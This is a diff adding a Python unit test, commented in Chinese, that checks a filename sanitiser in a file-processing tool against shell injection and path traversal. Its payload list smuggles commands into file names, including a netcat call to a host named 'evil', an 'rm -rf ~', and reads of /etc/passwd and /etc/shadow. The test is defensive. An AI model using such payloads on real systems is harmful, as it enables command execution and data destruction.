@@ -31,6 +31,58 @@ def _make_image(path, size="300x200", gradient="blue-red"):
     return os.path.exists(path)
 
 
+def test_filename_injection(s):
+    """文件名会进入 shell=True 执行的命令，必须先中和元字符。
+
+    真实攻击面：用户转发一个来自频道的恶意命名文件即可触发任意命令执行，
+    无需任何主动的危险操作。os.path.basename() 只挡路径穿越，不挡元字符。
+    """
+    s.section("shell 元字符必须被中和")
+    payloads = [
+        "report;touch PWNED;.pdf",
+        "a$(id).jpg",
+        "`whoami`.png",
+        "x|nc evil 1234.mp4",
+        "a && rm -rf ~.txt",
+        "n\newline.jpg",
+        "quote'\"quote.png",
+        "glob*?[].jpg",
+        "$HOME.txt",
+        "tab\there.pdf",
+    ]
+    dangerous = set(";|&$`()<>*?[]{}!\\'\" \n\t\r")
+    for raw in payloads:
+        got = fp.safe_filename(raw)
+        leaked = sorted(set(got) & dangerous)
+        s.check(f"{raw!r} 无残留元字符", leaked, [])
+
+    s.section("路径穿越")
+    s.check("../../etc/passwd", fp.safe_filename("../../etc/passwd"), "passwd")
+    s.check("绝对路径", fp.safe_filename("/etc/shadow"), "shadow")
+
+    s.section("可用性：正常文件名不被破坏")
+    s.check("中文保留", fp.safe_filename("季度报告.pdf"), "季度报告.pdf")
+    s.check("常规英文", fp.safe_filename("report_v2-final.docx"), "report_v2-final.docx")
+    s.truthy("空名有兜底", fp.safe_filename("") == "file")
+    s.truthy("纯符号有兜底", fp.safe_filename("***") == "file")
+    s.truthy("扩展名保留", fp.safe_filename("x;y.mp4").endswith(".mp4"))
+
+    s.section("端到端：注入载荷经收敛后不再触发")
+    if not (_has("convert") or _has("magick")):
+        return
+    work = tempfile.mkdtemp()
+    try:
+        safe = fp.safe_filename("report;touch PWNED_MARKER;.jpg")
+        path = os.path.join(work, safe)
+        _make_image(path)
+        marker = os.path.join(work, "PWNED_MARKER")
+        tool = "magick" if _has("magick") else "convert"
+        fp.execute_commands([f"{tool} {path} -quality 40 {work}/out.jpg"], work)
+        s.check("未产生注入痕迹", os.path.exists(marker), False)
+    finally:
+        shutil.rmtree(work, ignore_errors=True)
+
+
 def test_intent_shortcircuit(s):
     s.section("意图判定：关键词短路（零模型调用）")
     cases = [
@@ -218,6 +270,7 @@ def test_orchestration(s):
 
 
 SUITES = [
+    ("文件名注入防护", test_filename_injection),
     ("意图判定", test_intent_shortcircuit),
     ("菜谱选取", test_recipe_selection),
     ("工具链裁剪", test_toolchain_trim),
